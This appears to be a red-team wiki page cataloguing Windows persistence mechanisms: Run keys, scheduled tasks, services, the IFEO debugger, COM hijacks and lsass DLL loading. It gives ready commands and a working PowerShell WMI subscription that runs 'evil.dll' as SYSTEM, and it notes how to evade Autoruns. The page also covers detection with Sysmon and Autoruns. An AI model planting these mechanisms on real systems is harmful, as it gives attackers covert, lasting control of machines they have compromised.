---
title: Windows persistence techniques
slug: persistence-techniques-windows
---

> **TL;DR:** Run keys, scheduled tasks, services, WMI event subscriptions, COM hijack, and IFEO debugger — pick by required privilege, trigger semantics, and forensic visibility.

## What it is
Persistence = anything that causes your code to re-execute after reboot or logout. Each mechanism has a different triggering event (logon, schedule, service start, system event), required privilege, and detection profile. The trick is matching mechanism to engagement needs.

## Preconditions / where it applies
- Code execution and write access to the location of the persistence primitive (HKCU vs HKLM, user temp vs system32, scheduled task as user vs as SYSTEM)
- Awareness of what tooling the defender runs — Autoruns catches all of the obvious ones

## Technique
**User-context, no privilege required:**
- Registry Run keys: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` — classic, caught by Autoruns instantly
- Startup folder: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk`
- Scheduled task as current user: `schtasks /create /tn updater /tr "C:\... \payload.exe" /sc onlogon`
- COM hijack via `HKCU\Software\Classes\CLSID` — fires when host process invokes the hijacked CLSID ([[com-hijacking]])
- Office add-ins, registry-based: `HKCU\Software\Microsoft\Office\<App>\Addins\*`

**Privileged (SYSTEM/admin):**
- Service: `sc create svc binPath= "C:\path.exe" start= auto`
- IFEO debugger: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target>.exe` with `Debugger=cmd.exe`. Fires when `<target>.exe` launches.
- WMI permanent event subscription (filter + consumer + binding) — fires on WMI event (logon, time, process create)
- Print monitor / Security Support Provider / LSA Authentication Package — load DLL into lsass / spoolsv at boot
- Boot/Logon scripts via GPO
- Scheduled task as SYSTEM: same syntax as above with `/ru SYSTEM`

**Sneakier:**
- DLL hijack of a service binary that runs at boot
- BITS jobs with `SetNotifyCmdLine` so a failed transfer executes your binary
- Netsh helper DLL — registered with `netsh add helper`, loaded any time netsh runs
- Image-File-Execution-Options "GlobalFlag + SilentProcessExit" — chain on process exit
- TypedPaths shell extension, Background Activity Moderator (BAM), AppCertDlls

**WMI event subscription (powerful, harder to spot):**

```powershell
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  Name='F'; EventNamespace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name='C'; CommandLineTemplate="C:\Windows\System32\rundll32.exe C:\path\evil.dll,Run"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$filter; Consumer=$consumer }
```

Fires every 60s as SYSTEM. Survives reboot. Invisible to Autoruns until recent versions.

## Detection and defence
- Sysinternals Autoruns — covers >90% of the registry/scheduled-task surface
- Sysmon Event 11/12/13 for file/registry writes to known persistence locations
- Sysmon Event 19/20/21 for WMI filter/consumer/binding creates — high-fidelity since 2017
- ETW providers for scheduled tasks and services
- Defenders should baseline persistence locations on golden images and alert on diffs

## References
- [MITRE ATT&CK — Persistence](https://attack.mitre.org/tactics/TA0003/) — tactic-level catalogue with sub-techniques
- [ired.team — Persistence](https://www.ired.team/offensive-security/persistence) — code samples for most techniques
- [SpecterOps blog](https://posts.specterops.io/) — WMI persistence research
- [[com-hijacking]] [[dll-side-loading]] [[opsec-fundamentals]]
